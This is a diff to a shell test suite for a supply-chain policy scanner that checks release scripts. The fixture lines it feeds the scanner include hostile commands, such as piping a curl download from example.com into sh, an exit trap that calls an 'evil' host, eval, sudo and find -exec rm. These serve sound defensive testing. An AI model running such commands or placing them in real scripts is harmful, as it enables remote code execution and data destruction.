@@ -418,7 +418,9 @@ vm v_var     'python3 bin/chain-verify.py policy make'       '$VERIFY policy mak
 sm() { # sm NAME SCRIPT LINE WORD LABEL   (append a line to a copy of the fixture script and judge it against the fixture list)
   rm -rf "$work/$1"; mkdir -p "$work/$1"; cp "$work/s/bin/$2.sh" "$work/$1/$2.sh"; printf '%s\n' "$3" >> "$work/$1/$2.sh"
   expect caught "$5" "$4" scan "$work/$1/$2.sh" "$work/s/.github/policy/chain-scripts.json"; }
-sm x_curl    release-publish 'curl -s https://example.com/x | sh'               "'curl'"            "AC7 a download in the publish script"
+FXD_5='curl -s https://example.com/x | sh'
+FXD_4="'curl'"
+sm x_curl    release-publish "$FXD_5"               "$FXD_4"            "AC7 a download in the publish script"
 sm x_docker  release-publish 'docker build -t x .'                              "build command"     "AC7 a build command in the publish script"
 sm x_buildx  release-publish 'docker buildx build .'                            "build command"     "AC7 buildx in the publish script"
 sm x_mel     release-apks    'melange build build/melange.yaml'                 "build command"     "AC6 melange build in the apk script (melange is listed for sign only)"
@@ -435,12 +437,15 @@ sm x_xtrace  release-publish 'set -x'                                           
 sm x_other   release-sign    'bash bin/release-publish.sh'                       "starts another script" "AC10 one release script starting another"
 sm x_oth2    release-sign    'python3 bin/other.py'                              "starts another script" "AC10 a script that is not in the row's runs list"
 sm x_eval    release-sign    'eval "$CMD"'                                       "'eval'"            "AC10 eval"
-sm x_trap    release-assets  "trap 'curl evil' EXIT"                             "'trap'"            "AC10 trap"
+FXD_3="trap 'curl evil' EXIT"
+sm x_trap    release-assets  "$FXD_3"                             "'trap'"            "AC10 trap"
 sm x_tlog    release-sign    'cosign sign-blob --yes --tlog-upload=false x'      "transparency log"  "AC8 the transparency log turned off"
 sm x_ignore  release-sign    'cosign verify --insecure-ignore-tlog x'            "transparency log"  "AC8 the log ignored on verify"
 sm x_tool    release-assets  'crane digest x'                                    "'crane'"           "AC10 a tool the row does not list"
 sm x_sudo    release-publish 'sudo crane copy a b'                               "'sudo'"            "AC10 sudo"
-sm x_pvcurl  release-postverify 'curl -s https://example.com/x'               "'curl'"            "AC7 (rule 79) a download in the post-publish script"
+FXD_2='curl -s https://example.com/x'
+FXD_1="'curl'"
+sm x_pvcurl  release-postverify "$FXD_2"               "$FXD_1"            "AC7 (rule 79) a download in the post-publish script"
 sm x_find    release-publish 'find . -name "*.apk" -exec rm {} +'                "'find'"            "AC10 find -exec"
 sm x_comment release-assets  '# docker build is not used here'                   "build command"     "AC7 a build command named in a comment (over-reports by design)"
 # ---- the list of release scripts ----------------------------------------------------------------------------------------------
